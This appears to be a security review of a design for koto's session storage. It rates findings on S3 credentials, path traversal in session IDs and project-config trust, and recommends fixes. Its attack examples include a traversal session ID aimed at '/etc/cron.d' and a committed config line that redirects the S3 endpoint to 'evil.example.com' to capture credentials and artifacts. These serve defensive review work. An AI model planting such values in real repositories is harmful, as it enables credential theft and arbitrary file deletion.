# Security Review: DESIGN-session-persistence-storage

## Review scope

Five attack surfaces examined: S3 credential handling, session data exposure,
version counter manipulation, path traversal in session IDs, and project config
trust model.

---

## 1. S3 credential handling

### Findings

The design allows credentials in two places: `~/.koto/config.toml` (user config)
and environment variables. Env vars take precedence, which is correct. However:

**Risk: credentials in project config.** The design says project config
(`.koto/config.toml`) "should never contain credentials -- only endpoint, bucket,
and region." This is guidance, not enforcement. Nothing in the design prevents a
user from running `koto config set --project session.cloud.access_key AKIA...`,
which would commit an AWS key to git.

**Recommendation:** The config module should reject writes of credential keys
(`access_key`, `secret_key`) to project-level config. Hard-fail, not warn. This
is a small allowlist check in the `koto config set --project` path.

**Risk: user config file permissions.** The design notes `~/.koto/config.toml`
"should have 0600 permissions" but "koto doesn't enforce this." A
world-readable config file with AWS credentials is a local privilege escalation
vector on shared machines.

**Recommendation:** On `create` or first write, set 0600. On subsequent reads,
warn (to stderr, not stdout) if the file is group- or world-readable and contains
credential keys. This matches how SSH handles `~/.ssh/config`.

**Risk: credential leakage in error messages.** If the S3 client fails to
authenticate, the error may include the access key or request signature. The
design doesn't mention error sanitization.

**Recommendation:** Wrap S3 client errors before surfacing them to CLI output.
Strip any string matching `AKIA*` patterns or `Signature=` values.

### Severity: Medium

Credential-in-project-config is the highest-impact issue here because it leads
directly to secret exposure in public git repos.

---

## 2. Session data exposure

### Findings

The design is transparent that cloud sync uploads "all session artifacts (research
outputs, plans, decision reports, engine state)" to S3. No client-side encryption.
This is acceptable if users understand the trust boundary.

**Risk: unintentional sync of sensitive artifacts.** A workflow researching
competitive analysis or internal strategy could produce artifacts that shouldn't
leave the machine. The design has no per-session or per-artifact opt-out for sync.

**Recommendation:** Consider a `sync = false` flag in `session.meta.json` or a
`.koto-no-sync` marker file that prevents upload of specific sessions. Low
priority -- users can just use the local backend -- but it prevents accidental
sync when cloud is the default.

**Risk: S3 bucket misconfiguration.** The design correctly notes "the S3 bucket's
access policy determines who can read them" but offers no guidance on minimum
bucket policy. A public bucket would expose all session data.

**Recommendation:** During `CloudBackend::create`, issue a HEAD request or
GetBucketAcl check. If the bucket allows public read, warn loudly. This catches
the most common S3 misconfiguration.

### Severity: Low-Medium

The design is honest about the exposure. The risk is primarily user error
(misconfigured bucket, unintended sensitive content).

---

## 3. Version counter manipulation

### Findings

The version counter is a monotonic integer in `session.meta.json`, incremented on
each `sync_up`. Conflict detection compares local `last_synced_version` against
remote `version`.

**Risk: version downgrade via direct S3 manipulation.** An attacker with write
access to the S3 bucket could overwrite `session.meta.json` with a lower version
number, causing clients to believe their local state is newer. The next `sync_up`
would overwrite the attacker's payload -- but if the attacker also replaces
artifact files, the victim's `sync_down` would pull corrupted artifacts before
the version check catches up.

**Attack flow:**
1. Attacker writes malicious artifacts + metadata with `version: N+1` to S3
2. Victim's `sync_down` sees remote version > local `last_synced_version`
3. Victim downloads all files, including malicious artifacts
4. If artifacts contain gate commands (shell-executed), arbitrary code runs

**Recommendation:** This is an inherent risk of any shared storage without
cryptographic integrity. For the current threat model (single-user, personal S3
bucket), it's acceptable. Document that the S3 bucket should be treated as a
trusted store. For future multi-user scenarios, consider signing
`session.meta.json` with an HMAC derived from a user secret.

**Risk: conflict resolution bypass.** `koto session resolve --keep local|remote`
force-resolves conflicts. If an attacker can trigger a conflict (by racing a
`sync_up`), the user might choose `--keep remote` and accept attacker-controlled
state.

**Recommendation:** When resolving conflicts, show a diff summary of what changed
remotely. Don't just ask local vs. remote -- show what "remote" contains.

### Severity: Low

Requires S3 write access, which means the attacker already has credentials. The
real threat is credential compromise, not version manipulation.

---

## 4. Path traversal in session IDs

### Findings

Session IDs are derived from workflow names and used directly in filesystem paths:
`~/.koto/sessions/<id>/` (local) and `<repo>/<wip_path>/<id>/` (git). The design
doesn't specify input validation on session IDs.

**Risk: directory traversal.** A workflow name like `../../etc/cron.d/backdoor`
would resolve to paths outside the session root. For `LocalBackend`:
`~/.koto/sessions/../../etc/cron.d/backdoor/`. For `GitBackend`:
`<repo>/wip/../../etc/cron.d/backdoor/`.

**Attack vector:** A malicious template (installed from an untrusted source) could
set a workflow name that escapes the session directory. The `cleanup` operation
could then delete arbitrary directories.

**Risk: null bytes and special characters.** Depending on the OS and filesystem,
session IDs containing null bytes, newlines, or other control characters could
cause unexpected behavior in path operations or shell commands.

**Recommendation:** Validate session IDs at creation time. Allow only
`[a-zA-Z0-9._-]` characters. Reject any ID containing `/`, `\`, `..`, or
control characters. This is a must-fix -- path traversal in a tool that creates
and deletes directories is a high-severity issue.

Additionally, `session_dir` should canonicalize the result and verify it's a
child of the expected root directory (defense in depth).

### Severity: High

Path traversal leading to arbitrary file write/delete is a classic high-severity
vulnerability. The fix is straightforward (input validation + canonicalization)
and should be implemented in Phase 1.

---

## 5. Project config trust model

### Findings

`.koto/config.toml` is committed to git and loaded automatically when koto runs
in a repository. It can set the backend type, S3 endpoint, bucket, and git wip
path.

**Risk: malicious backend configuration.** A contributor could submit a PR that
adds or modifies `.koto/config.toml` to point to an attacker-controlled S3
endpoint. If the victim has AWS credentials configured (via env vars or user
config), `sync_up` would send all session artifacts -- including research,
plans, and engine state -- to the attacker's server.

This is similar to `.gitconfig` injection attacks. The project config file is
implicitly trusted because it's in the repo.

**Attack flow:**
1. Attacker submits PR adding `.koto/config.toml` with
   `session.cloud.endpoint = "https://evil.example.com"`
2. Victim checks out the PR branch for review
3. Victim runs any koto command with cloud backend enabled
4. Victim's AWS credentials are sent to attacker's endpoint (via S3 API auth
   headers), and session artifacts are uploaded there

**Recommendation:** This is the most significant finding. Options:

- **Option A (minimum):** Warn on first use of a project config that sets cloud
  backend parameters. Require explicit `koto config trust` before project cloud
  config takes effect.
- **Option B (stronger):** Project config cannot set `session.cloud.endpoint` or
  `session.cloud.bucket`. These must come from user config or env vars. Project
  config can only set `session.backend` and `session.git.path`.
- **Option C (strongest):** Project config is limited to non-security-sensitive
  keys. All cloud parameters require user-level config or env vars.

I recommend **Option B**. It allows teams to agree on "use cloud backend" via
project config while preventing endpoint hijacking. The endpoint and bucket --
which determine where data goes -- must be explicitly configured per-user.

**Risk: git wip_path manipulation.** Project config controls `session.git.path`,
which determines where `GitBackend` writes. A malicious value like `../` would
write session artifacts outside the repo. This combines with the path traversal
issue in finding 4.

**Recommendation:** Validate that `session.git.path` resolves to a path within
the repository root. Canonicalize and check containment.

### Severity: High

The project config trust issue is the most architecturally significant finding.
A committed config file that can redirect data to an attacker-controlled endpoint
is a supply-chain attack vector. This needs to be addressed in the design before
implementation.

---

## Summary of recommendations

| # | Finding | Severity | Recommendation |
|---|---------|----------|----------------|
| 4 | Path traversal in session IDs | High | Validate IDs: `[a-zA-Z0-9._-]` only. Canonicalize paths. |
| 5 | Project config can redirect to malicious endpoint | High | Restrict cloud endpoint/bucket to user config or env vars only. |
| 1a | Credentials writable to project config | Medium | Reject credential keys in `--project` config writes. |
| 1b | User config file permissions | Medium | Set 0600 on create, warn on read if world-readable. |
| 1c | Credential leakage in errors | Low | Sanitize S3 error output. |
| 2a | Unintentional sync of sensitive sessions | Low | Consider per-session sync opt-out. |
| 2b | Public S3 bucket | Low | Warn if bucket allows public read. |
| 3 | Version counter manipulation | Low | Document trust model. Show diff on conflict resolution. |

## Recommended outcome

**OPTION A (Decision 1), OPTION A (Decision 2), OPTION C (Decision 3)** -- the
design's chosen options are sound. The SessionBackend trait, simple TOML config,
and engine-provided variables are the right architectural choices.

The design should proceed with the chosen options, but must address the two
high-severity findings before implementation begins: session ID validation (path
traversal) and project config trust boundaries (endpoint restriction). These are
additive -- they don't change the architecture, they constrain inputs.
